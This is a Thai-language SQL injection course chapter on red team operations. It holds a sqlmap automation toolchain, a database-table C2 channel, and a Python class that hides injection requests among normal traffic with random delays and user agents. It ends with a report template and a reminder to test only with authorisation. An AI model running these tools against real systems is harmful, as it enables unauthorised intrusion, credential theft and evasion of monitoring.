# Part 061: Red Team SQL Injection Operations

## ภาพรวม

Red Team operations ใช้ SQL injection เป็นส่วนหนึ่งของการทดสอบเชิงลึก

**ขั้นตอนที่ 986-1000**

---

## 986. Red Team คืออะไร

```
Red Team = คณะที่จำลองเป็นผู้โจมตีจริงเพื่อทดสอบการตอบสนองขององค์กร
แตกต่างจาก pentest ตรงที่: มี full scope, ใช้เวลานาน, เน้น stealth

SQL Injection ใน Red Team:
1. Initial Access - เข้าถึงเครือข่ายผ่าน web
2. Discovery - เชิง DB enumerate credentials
3. Lateral Movement - เอา credentials ไปใช้ service อื่น
4. Persistence - สร้าง backdoor DB user
5. Exfiltration - เอาข้อมูลออกไป
```

---

## 987. Red Team Toolchain

```bash
# Red Team SQLi toolchain

# 1. Reconnaissance
nmap -sV -p 80,443,8080,8443 target.com
whatweb http://target.com  # Detect technologies
wappalyzer-cli http://target.com

# 2. หา injection points
hakrawler -url https://target.com -depth 3 -plain | \
  grep -E '\?.*=' | sort -u > injection_points.txt

# 3. Test แต่ละ point
cat injection_points.txt | while read url; do
  sqlmap -u "$url" --batch --level=2 --risk=2 \
    --output-dir=./sqlmap_results 2>/dev/null
done

# 4. Manual verification
curl -s "http://target.com/page?id=1'" | grep -i 'sql\|mysql\|syntax\|error'

# 5. เชิง enumerate DB
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D mydb --tables --batch
```

---

## 988. C2 ผ่าน SQL Injection

```python
# ใช้ DB เป็น Command & Control channel
# (Advanced technique สำหรับการศึกษา)

# MySQL: ใช้ตารางเป็น C2 channel
CREATE TABLE IF NOT EXISTS c2_channel (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id VARCHAR(50),
    command TEXT,
    output TEXT,
    status ENUM('pending','executed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Attacker ส่ง command:
INSERT INTO c2_channel (agent_id, command) VALUES ('agent-001', 'whoami');

-- Agent ฝัง command:
SELECT id, command FROM c2_channel 
WHERE agent_id='agent-001' AND status='pending';

-- Agent ส่ง result:
UPDATE c2_channel SET output='root', status='executed' WHERE id=1;
```

---

## 989. OPSEC ใน SQL Injection

```python
import time
import random
import hashlib
from datetime import datetime

class StealthSQLi:
    """SQL injection ด้วยเทคนิค OPSEC"""
    
    def __init__(self, target_url: str, session):
        self.url = target_url
        self.session = session
    
    def random_delay(self, min_s=0.5, max_s=3.0):
        """Random delay เพื่อหลีก rate-based detection"""
        time.sleep(random.uniform(min_s, max_s))
    
    def randomize_headers(self) -> dict:
        """User agents แบบ random"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0',
        ]
        return {'User-Agent': random.choice(agents)}
    
    def extract_with_opsec(self, payload: str, param: str = 'id'):
        """Send payload ด้วย OPSEC measures"""
        self.random_delay()
        headers = self.randomize_headers()
        
        # Blend normal requests with attack
        for _ in range(random.randint(1, 3)):
            self.session.get(self.url, params={param: '1'}, headers=headers)
            self.random_delay(0.2, 1.0)
        
        # Attack request
        r = self.session.get(
            self.url,
            params={param: payload},
            headers=headers
        )
        
        return r
```

---

## 990. Full Red Team Report Template

```markdown
# Red Team Assessment Report

## Executive Summary
- สรุปช่องโหว่และผลกระทบ
- Risk Rating: Critical/High/Medium/Low

## Attack Path
ขั้นตอนการโจมตีที่อยู่ในรูป attack chain:

1. Recon: hakrawler, nmap, whatweb
2. Initial SQLi: ค้นพบ injection ที่ /page?id=
3. DB Enumeration: databases, tables, columns
4. Credential Theft: users table dump
5. Lateral Movement: ใช้ credentials เข้า admin panel
6. Persistence: backdoor DB user สร้าง
7. Data Exfiltration: OOB DNS exfiltration

## Evidence
- Screenshots
- HTTP traffic logs (Burp)
- Command output

## Recommendations
1. Parameterized queries ทุกจุด
2. WAF with SQL injection rules
3. Database monitoring
4. Principle of least privilege
5. Regular security testing

## CVSS Score
- Attack Vector: Network
- Privileges Required: None
- CVSS 3.1: 9.8 (Critical)
```

---

## สรุป: สิ้นสุด ขั้นตอน 1-1000

```
อยู่ หลักสูตร SQL Injection จากระดับพื้นฐานสู่ระดับโลก:

[01-100] พื้นฐาน - ประเภท, การตรวจจับ, เครื่องมือ
[101-200] เทคนิคเฉพาะ - Union, Blind, Time-based
[201-300] Databases - MySQL, MSSQL, PostgreSQL, Oracle, SQLite
[301-400] Advanced - WAF bypass, OOB, Second-order
[401-500] Special - NoSQL, Stacked queries, APIs, CTF
[501-600] Defense - Prepared statements, code review
[601-700] Automation - SQLMap, custom tools
[701-800] ORM/Framework - Django, SQLAlchemy, Hibernate
[801-900] Operations - Red Team, Bug Bounty, Monitoring
[901-1000] World-class - Cloud, Microservices, Container, CI/CD

สิ่งที่ต้องจำ:
- ไม่เคย inject โดยไม่ได้รับอนุญาต
- โชคเคราะห์ vulnerability disclosure
- Bug bounty programs จ่ายค่าตอบแทน
```

---

*Part 061 | SQL Injection Course Complete | สำหรับการศึกษาเท่านั้น*
